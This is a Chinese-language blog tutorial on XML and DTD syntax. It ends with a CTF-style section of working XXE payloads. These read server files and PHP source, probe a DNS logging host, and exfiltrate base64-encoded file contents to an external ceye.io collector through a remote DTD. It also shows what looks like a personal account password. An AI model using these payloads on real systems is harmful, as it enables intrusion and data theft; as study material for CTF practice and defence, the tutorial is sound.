# XML简介

a) xml， eXtensible Markup Language， 可拓展标记语言.是一种标记语言.
b) xml是一种非常灵活的语言， 没有固定的标签， 所有的标签都可以自定义.
c) 通常，xml被用于信息的记录和传递. 因此xml经常用于充当配置文件

# XML格式

a) 声明信息 ,用于描述XML的版本,编码方式.

版本始终是1.0 编码一般选utf-8



```
<?xml version="1.0" encoding="UTF-8"?>
```

b) 根元素 (一对标签)

根元素有且仅有一个

c) xml是大小写敏感的

d) 标签是成对的,而且要正确嵌套

e) 属性值要使用双引号

下面id就是属性,""里面是属性值



```
<?xml version="1.0" encoding="utf-8"?>
<a>
	<aa id="101">
		xxx
	</aa>
</a>
```

f) 注释写法



```
<!-- 这里是注释-->
```



```
<?xml version="1.0" encoding="utf-8"?>
<books>
	<book>
		<name>
			xml101
		</name>
		<author>
			张三
		</author>
		<price>
			50.5
		</price>
	</book>
	<book>
		<name>
			xml102
		</name>
		<author>
			李四
		</author>
		<price>
			40.4
		</price>
	</book>
</books>
<!-- 这里是注释-->
```

可以直接用浏览器打开

[![img](https://img2020.cnblogs.com/blog/1863787/202007/1863787-20200718221811798-883476438.png)](https://img2020.cnblogs.com/blog/1863787/202007/1863787-20200718221811798-883476438.png)

还可以折叠

[![img](https://img2020.cnblogs.com/blog/1863787/202007/1863787-20200718221831430-1061889293.png)](https://img2020.cnblogs.com/blog/1863787/202007/1863787-20200718221831430-1061889293.png)

# DTD

## DTD简介

a) DTD , Document Type Definition,文档类型定义

b) DTD 用于约束xml的文档格式，保证xml是一个有效的xml.

c) DTD 可以分为两种，内部DTD,外部DTD.

## DTD内部声明

假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：



```
<!DOCTYPE 根元素 [元素声明]>
```

元素声明语法 :

**数量词**

`+`: 出现一次或多次
`?`: 出现0次或一次
`*`: 出现任意次



# XML漏洞



利用方式1:(buuctf  Fake XML cookbook)

条件:**当输入错误用户名和密码时,服务段会返回用户名**

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE updateProfile [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=./doLogin.php"> 
]>

<user><username>&xxe;</username><password>123</password></user>
```

burpsuite抓包之后填充以上内容

#读取网页源码

利用方式2:

读取文件

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE updateProfile [
<!ENTITY xxe SYSTEM "file:///flag"> 
]>

<user><username>&xxe;</username><password>123</password></user>
```

以上是存在回显的利用，输入的参数会在服务端中返回，那么当参数不回显时怎么利用呢？



当用户名错误和密码错误服务端直接返回登录成功和登录失败，不把输入的参数回显出来。这样即使存在XXE漏洞，我们直接构造读取文件的payload，由于数据不回显，我们也无法获取到读取的数据内容。

无回显只是不能获取数据内容，但实则攻击载荷还是会执行。所以可以利用ssrf快速的判断是否存在xxe漏洞(前提是服务器出网)：
使用dnslog平台([DNSLog Platform](http://www.dnslog.cn/))，利用xxe漏洞让服务器访问dnslog，如果存在访问记录就代表漏洞利用成功



```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE updateProfile [
<!ENTITY % xxe SYSTEM "http://2n24n8.dnslog.cn">
%xxe; 
]>

<user><username>aaaa</username><password>123</password></user>
```

那么如何获取数据内容呢？

**利用方式1:** 外部搭建http服务器，将读取的内容当作请求参数访问外部的Http服务器，查看http服务器的访问记录就能获取文件内容
利用[ceye](http://ceye.io/)平台(password:Chen88222030)接收http请求



```
<!DOCTYPE updateProfile [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=./doLogin.php">
<!ENTITY % dtd SYSTEM "http://本机ip:88/1.dtd">
%dtd;
%send;
]>

<user><username>aaaa</username><password>123</password></user>
```

1.dtd内容如下

>```
><!ENTITY % all 
>"<!ENTITY &#x25; send SYSTEM 'http://cyuhik.ceye.io/?data=%file;'>"
>
>>%all;
>```
>
>
>